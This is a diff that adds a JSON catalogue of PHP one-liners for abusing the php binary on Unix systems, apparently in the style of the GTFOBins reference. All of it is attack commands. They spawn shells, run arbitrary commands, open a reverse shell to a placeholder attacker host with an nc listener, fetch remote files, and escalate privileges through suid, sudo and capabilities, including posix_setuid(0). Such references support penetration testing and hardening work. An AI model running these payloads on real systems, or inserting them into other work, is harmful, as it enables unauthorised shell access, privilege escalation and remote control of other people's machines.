@@ -1,0 +1,59 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "php -r 'system(\"/bin/sh\");'\n"
+      },
+      {
+        "code": "php -r 'passthru(\"/bin/sh\");'\n"
+      },
+      {
+        "code": "php -r 'print(shell_exec(\"/bin/sh\"));'\n"
+      },
+      {
+        "code": "php -r '$r=array(); exec(\"/bin/sh\", $r); print(join(\"\\\\n\",$r));'\n"
+      },
+      {
+        "code": "php -r '$h=@popen(\"/bin/sh\",\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'\n"
+      }
+    ],
+    "command": [
+      {
+        "code": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"[command]\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "php -r '$sock=fsockopen(\"[host]\",[port]);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.",
+        "code": "php -S [host]:[port]\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "php -r 'file_put_contents(\"[file]\", file_get_contents(\"[url]\"));'\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
+      }
+    ],
+    "capabilities": [
+      {
+        "code": "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n"
+      }
+    ]
+  }
+}
